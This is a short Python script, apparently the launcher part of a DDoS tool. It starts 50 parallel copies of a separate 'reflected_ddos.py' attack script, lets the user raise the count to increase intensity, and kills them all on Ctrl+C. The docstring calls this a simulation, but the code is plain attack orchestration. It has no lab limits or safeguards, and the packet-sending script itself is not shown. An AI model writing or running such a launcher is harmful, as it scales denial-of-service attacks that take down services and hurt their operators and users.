"""
Reflected DDoS Launcher

This script launches multiple instances of the reflected_ddos.py script in parallel
to simulate a reflected DDoS attack.

Usage: python3 main.py
"""

import subprocess
import time
import os


def spawn_attacks(script_command, process_pool):
    """
    Launch multiple subprocesses of the reflected DDoS script
    and keep track of them in a list.
    """
    num_processes = 50  # Adjust as needed to increase/decrease intensity
    for i in range(num_processes):
        print(f"[+] Launching reflected DDoS process #{i}")
        proc = subprocess.Popen(script_command)
        process_pool.append(proc)


def terminate_all(processes):
    """
    Attempt to cleanly terminate all running subprocesses.
    Force kill if necessary.
    """
    for proc in processes:
        proc.terminate()
        try:
            os.kill(proc.pid, 9)  # Force kill if terminate doesn't work
        except Exception:
            pass

    for proc in processes:
        proc.wait()


def main():
    process_pool = []
    attack_script = ['python3', 'reflected_ddos.py']

    spawn_attacks(attack_script, process_pool)
    print("Reflected DDoS running... Press CTRL+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Terminating processes...")
        terminate_all(process_pool)
        print("[+] All attack processes successfully terminated.")


if __name__ == "__main__":
    main()
